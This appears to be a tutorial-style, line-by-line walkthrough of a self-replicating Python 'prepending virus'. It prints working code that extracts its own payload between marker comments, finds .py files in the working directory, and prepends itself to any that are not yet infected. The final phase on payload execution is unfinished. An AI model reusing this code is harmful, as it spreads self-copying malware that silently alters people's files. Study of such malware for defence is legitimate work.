## 📖 Code Walkthrough & Line-by-Line Breakdown

This section breaks down how the prepending script mechanism reads its own source code, scans local directories, and injects itself into target `.py` files while preserving original file functionality.

---

### Phase 1: Self-Introspection & Payload Extraction

```python
# Open current executing file and extract code between delimiter markers
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if line == '### THE VIRUS STARTS HERE ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###\n':
        break
```

- sys.argv[0]: References the file path of the currently executing script.
- Flag (virus_area): Acts as a toggle. When the parser encounters the comment ### THE VIRUS STARTS HERE ###, it flips virus_area to True.
- Array Append (code.append(line)): Reads and copies every line of code until it reaches ### THE VIRUS ENDS HERE ###, storing the extracted payload block into the code array in memory.

---

### Phase 2: Target File Discovery

```python
# Scan current working directory for Python scripts
python_scripts = glob.glob('*.py')
```

- glob.glob('*.py'): Searches the current directory for files matching the .py file extension and returns them as a list.

---

### Phase 3: Infection Check & Prepending Logic

```python
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False

    # Check if target already contains the signature marker
    for line in script_code:
        if line == '### THE VIRUS STARTS HERE ###\n':
            infected = True
            break
```

- Preventing Re-Infection Loops: Before modifying a file, the script opens and scans each line of the target script for the marker ### THE VIRUS STARTS HERE ###.
- Infection Flag: If the signature is found, infected = True stops further inspection, leaving already modified files untouched.

```python
if not infected:
        final_code = []
        final_code.extend(code)         # Insert payload first
        final_code.extend('\n')        # Add line separator
        final_code.extend(script_code)  # Append target's original code

        with open(script, 'w') as f:
            f.writelines(final_code)
```

- Prepending Structure: If uninfected, a new buffer (final_code) is constructed:
    - Extracted code block (code) is placed at the top (beginning of file).
    - Original code (script_code) is appended directly after the injected code.
- File Overwrite: The target file is opened in write mode ('w'), replacing the original contents with the newly prepended combined code.

---

### Phase 4: Execution & Host Code Masking

To be continued
